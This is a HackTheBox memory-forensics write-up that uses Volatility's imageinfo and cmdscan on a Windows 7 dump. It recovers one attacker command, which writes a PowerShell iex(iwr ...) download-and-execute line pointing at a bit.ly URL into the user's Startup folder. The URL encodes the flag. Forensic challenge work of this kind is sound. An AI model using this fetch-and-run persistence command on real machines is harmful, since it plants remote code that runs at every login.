# Export

Completed: Yes
Date: July 2, 2021 → July 2, 2021
Platform: HackTheBox

Use volatility as it is a memory dump. Identifying profile:

```bash
~/tools/volatility/volatility_2.6_lin64_standalone -f WIN-LQS146OE2S1-20201027-142607.raw imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/Downloads/WIN-LQS146OE2S1-20201027-142607.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80001a540a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80001a55d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2020-10-27 14:26:09 UTC+0000
     Image local date and time : 2020-10-27 19:56:09 +0530
```

Check the options and opportunities of volatility:

```bash
Supported Plugin Commands:

  amcache         Print AmCache information
  apihooks        Detect API hooks in process and kernel memory
  atoms           Print session and window station atom tables
  atomscan        Pool scanner for atom tables
  auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv
  bigpools        Dump the big page pools using BigPagePoolScanner
  bioskbd         Reads the keyboard buffer from Real Mode memory
  cachedump       Dumps cached domain hashes from memory
  callbacks       Print system-wide notification routines
  clipboard       Extract the contents of the windows clipboard
  cmdline         Display process command-line arguments
  cmdscan         Extract command history by scanning for _COMMAND_HISTORY
  consoles        Extract command history by scanning for _CONSOLE_INFORMATION
  crashinfo       Dump crash-dump information
```

The challenge description says that the attackers did something on the machine. So, the right way to think is some command line activity. Thus, the right option is cmdscan.

```bash
~/tools/volatility/volatility_2.6_lin64_standalone -f WIN-LQS146OE2S1-20201027-142607.raw --profile Win7SP1x64 cmdscan
Volatility Foundation Volatility Framework 2.6
**************************************************
CommandProcess: conhost.exe Pid: 1780
CommandHistory: 0x257430 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 1 LastAdded: 0 LastDisplayed: 0
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 @ 0x23bde0: echo iex(iwr "http%3A%2F%2Fbit.ly%2FSFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30%3D.ps1") > C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\3usy12fv.ps1
**************************************************
CommandProcess: conhost.exe Pid: 1796
CommandHistory: 0x2c6a90 Application: DumpIt.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
```

Here, we see that the attackers wrote the link to a file, which they wanted, I think, to execute later. The link is a base64 encoded flag.